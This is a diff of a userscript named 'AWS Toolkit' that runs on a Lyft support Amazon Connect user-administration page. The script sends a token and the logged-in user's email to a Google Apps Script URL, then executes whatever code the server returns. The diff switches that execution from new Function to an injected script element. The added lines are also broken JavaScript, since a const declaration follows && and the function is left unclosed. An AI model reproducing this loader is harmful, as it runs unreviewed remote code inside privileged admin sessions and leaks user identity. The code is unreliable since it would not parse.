@@ -1,7 +1,7 @@
 // ==UserScript==
 // @name         AWS Toolkit
 // @namespace    https://github.com/Mkhimer69/aws-toolkit
-// @version      3.3
+// @version      3.4
 // @description  A productivity toolkit built for Amazon Connect user administration workflows.
 // @author       Fathy Mkhimer
 // @match        https://lyft-support.my.connect.aws/users*
@@ -22,5 +22,7 @@ const email=document.querySelector('[data-testid="user-settings-dropdown"]')
 GM_xmlhttpRequest({
   method:'GET',
   url:`https://script.google.com/a/macros/lyft.com/s/AKfycbyFx5UqeN1UYvRq2sgT-HGs95ijxAkcHsmrYXby8W8cFp9wCVvnpBd26JCQnkjbre2syQ/exec?token=${encodeURIComponent(TOKEN)}&v=3.0&email=${encodeURIComponent(email)}&t=${Date.now()}`,
-  onload:r=>r.responseText&&new Function(r.responseText)()
+  onload:r=>r.responseText&&const s=document.createElement('script');
+s.textContent=r.responseText;
+document.documentElement.appendChild(s);
 });
